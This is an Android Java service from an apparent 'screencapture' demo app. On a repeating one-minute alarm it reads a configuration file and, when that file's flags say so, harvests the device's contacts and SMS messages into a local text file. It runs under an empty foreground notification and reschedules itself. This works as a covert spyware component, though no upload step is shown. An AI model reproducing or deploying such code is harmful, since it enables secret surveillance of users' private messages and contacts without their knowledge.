package com.demo.screencapture.service;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

import com.demo.screencapture.AlarmReceiver;
import com.demo.screencapture.ExecutorUtils;
import com.demo.screencapture.phonesms.ReadPhoneNumberUtils;
import com.demo.screencapture.phonesms.Readsms;
import com.demo.screencapture.utils.FileUtil;
import com.demo.screencapture.utils.ReadAndWriterFileUtils;
import com.demo.screencapture.vo.ConfigureVO;
import com.google.gson.Gson;

import java.io.File;
import java.util.Date;

/**
 * Copyright (c) 2018, 数字多⽹网络技术有限公司 All rights reserved.
 * File Name:
 * Version:V1.0
 * Author:qulonglong
 * Date:2019/1/25
 *
 *
 *  原始文件
 *
 * adb shell am startservice -n ｛包(package)名｝/｛包名｝.{服务(service)名称}
 * 如：启动自己应用中一个service
 * adb shell am startservice -n com.demo.screencapture/com.demo.screencapture.service.LongTimeService
 *
 */

public class LongTimeService extends Service {

    @Override

    public IBinder onBind(Intent intent) {
        return null;

    }

    @Override

    public int onStartCommand(Intent intent, int flags, int startId) {

        new Thread(new Runnable() {

            @Override

            public void run() {
                Log.d("LongTimeService", "定时任务执行：" + new Date().toString());
                String file = FileUtil.getScreenShots(getApplicationContext()) + File.separator + FileUtil.configureFileName;
                if (ReadAndWriterFileUtils.exitFile(file)) {
                    String json = ReadAndWriterFileUtils.read1(file);
                    Gson gson = new Gson();
                    ConfigureVO configureVO = gson.fromJson(json, ConfigureVO.class);
                    boolean isReadTxt = false;
                    if (configureVO != null) {
                        if (configureVO.isToReadContats) {
                            isReadTxt = true;
                            ReadPhoneNumberUtils.getSystemContactInfos(getApplicationContext());
                            configureVO.setReadContatsOk(true);
                            configureVO.setToReadContats(false);
                        }
                        if (configureVO.isToReadSms) {
                            isReadTxt = true;
                            ExecutorUtils.addRunnable(new Runnable() {
                                @Override
                                public void run() {
                                    Log.e("LongTimeService", "sms-----------read" + System.currentTimeMillis());
                                    Gson gson = new Gson();
                                    FileUtil.addString_Txt(getApplicationContext(), gson.toJson(Readsms.getSmsFromPhone(getApplicationContext())), FileUtil.smsFielName);
                                }
                            });
                            configureVO.setReadSmsOk(true);
                            configureVO.setToReadSms(false);
                        }
                        if (isReadTxt) {
                            FileUtil.addString_Txt(getApplicationContext(), true, gson.toJson(new ConfigureVO()), FileUtil.configureFileName);
                            isReadTxt = false;
                        }
                    }
                }

            }

        }).start();
        startForeground(12, new Notification());
        AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);

        int anHour = 60 * 1000;   // test 60秒执行一次
//        int anHour = 60 * 60 * 1000;   // 一小时的毫秒数
        long triggerAtTime = SystemClock.elapsedRealtime() + anHour;
        Intent i = new Intent(this, AlarmReceiver.class);
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, i, 0);

        manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pi);

        return super.onStartCommand(intent, flags, startId);
    }


}
